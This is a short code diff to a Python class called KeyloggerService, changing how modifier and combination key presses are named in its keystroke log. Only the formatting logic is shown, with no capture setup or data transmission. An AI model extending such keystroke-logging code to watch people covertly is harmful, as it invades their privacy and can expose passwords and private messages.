@@ -26,10 +26,13 @@ class KeyloggerService:
 
     @staticmethod
     def get_keyword(key: keyboard.KeyboardEvent) -> str:
-        key_name = key.name
-        if len(key_name) > 1:
-            key_name = '~' + key_name + '~'
-        return key_name
+        if len(key.name) > 1:
+            key_array = [value.name for k,value in keyboard._pressed_events.items()]
+            string = "".join(key_array)
+            key_name = "~" + string + "~"
+            return key_name
+        else:
+            return key.name
 
     @staticmethod
     def get_time(key: keyboard.KeyboardEvent) ->str:
